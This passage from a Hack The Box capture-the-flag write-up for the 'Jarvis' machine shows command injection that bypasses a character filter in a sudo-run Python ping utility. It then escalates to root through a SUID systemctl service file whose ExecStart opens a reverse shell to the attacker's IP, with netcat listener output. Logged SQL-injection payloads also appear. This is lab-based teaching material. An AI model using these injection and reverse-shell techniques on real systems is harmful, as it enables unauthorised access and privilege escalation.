            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()
	
    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1
	
    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
	
def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req
			
def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]
	
def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req
	
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

```shell
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py
< sudo -u pepper /var/www/Admin-Utilities/simpler.py
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************


********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
```

After reading through all the Python code, this Python script can list all the statistics about the attacker based on the log file in `/home/pepper/Web/Logs/`:

```shell
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -s
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Statistics
-----------
Number of Attackers: 1
Most Risky:
    10.10.14.15 - Attack Level : 3 Request: : GET /site/\'%20UNION%20ALL%20SELECT%20FileToClob(\'/etc/passwd\',\'server\')::html,0%20FROM%20sysusers%20WHERE%20username=USER%20--/.html
Most Recent: 10.10.14.15 --> 2023-07-28 06:24:59 : GET /index.php?news7[\\\"functions\\\"]=http://blog.cirt.net/rfiinc.txt
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -l
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Attackers
-----------
10.10.14.15 - Attack Level : 3
```

Nothing weird in `-s` and `-l` option.

**However, the `-p` option, we can ping a machine:**
```shell
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.042 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.056 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.044 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.058 ms
```

**Source code:**
```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
[...]
if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
    [...]
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    [...]
```

In here, we can see that our input will be parsed to `os.system('ping <command>')`. However, it'll filter the `forbidden` characters first, if the input contains a forbidden character, it'll just exit the program.

With that said, it's still vulnerable to **OS command injection**!

**In Bash, we can use `$(<command>)` to run arbitrary commands!**
```
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
<do -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(id)
ping: groups=1000(pepper): Temporary failure in name resolution
```

**Nice! That being said, we can escalate our privilege from `www-data` to `pepper`!**
```shell
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
[...]
Enter an IP: $(cp /bin/bash /tmp/pepper_bash)
[...]
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
[...]
Enter an IP: $(chmod +s /tmp/pepper_bash)
[...]
```

What this does is to copy `/bin/bash` to `/tmp/pepper_bash`, and add SUID sticky bit to it, so that we can spawn a Bash shell as user `pepper`.

```shell
www-data@jarvis:/var/www/html$ ls -lah /tmp/pepper_bash
-rwsr-sr-x 1 pepper pepper 1.1M Jul 28 08:53 /tmp/pepper_bash
www-data@jarvis:/var/www/html$ /tmp/pepper_bash -p
whoami; hostname; id;ip a
pepper
jarvis
uid=33(www-data) gid=33(www-data) euid=1000(pepper) egid=1000(pepper) groups=1000(pepper),33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:71:d5 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.143/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:71d5/64 scope link 
       valid_lft forever preferred_lft forever
```

**Now, our `euid` (Effective User ID) is user `pepper`!**

**user.txt:**
```shell
cat /home/pepper/user.txt
{Redacted}
```

### pepper to root

**During the enumeration in `www-data`, we found that `/bin/systemctl` has SUID sticky bit!**

That being said, we can escalate our privilege to `root`!

**You could follow [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#suid), but I found [this GitHub Gist](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740) is better to me.**

- **Create a service file:**

```sh
cd /dev/shm
cat << EOF > rootrevshell.service
[Unit]
Description=givemerootpls

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/53 0>&1'

[Install]
WantedBy=multi-user.target
EOF
```

```shell
ls -lah /dev/shm/rootrevshell.service
-rw-r--r-- 1 pepper pepper 169 Jul 28 09:08 /dev/shm/rootrevshell.service
```

When this service starts, it'll it run as `root` and send a reverse shell payload.

- Setup a netcat listener based on the reverse shell's port:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|21:08:05(HKT)]
└> rlwrap -cAr nc -lvnp 53
listening on [any] 53 ...
```

- **Create and start the service:**

```shell
/bin/systemctl enable /dev/shm/rootrevshell.service
Created symlink /etc/systemd/system/multi-user.target.wants/rootrevshell.service -> /dev/shm/rootrevshell.service.
Created symlink /etc/systemd/system/rootrevshell.service -> /dev/shm/rootrevshell.service.

/bin/systemctl start rootrevshell
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|21:08:05(HKT)]
└> rlwrap -cAr nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.143] 47078
[...]
root@jarvis:/# whoami;hostname;id;ip a
whoami;hostname;id;ip a
root
jarvis
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:71:d5 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.143/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:71d5/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
root@jarvis:~# cat root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728211001.png)

## Conclusion

What we've learned:

1. Remote Code Execution (RCE) Via Union-Based SQL Injection With `Into outfile`
2. OS Command Injection & Filter Bypass
3. Vertical Privilege Escalation Via Misconfigurated `systemctl` SUID Binary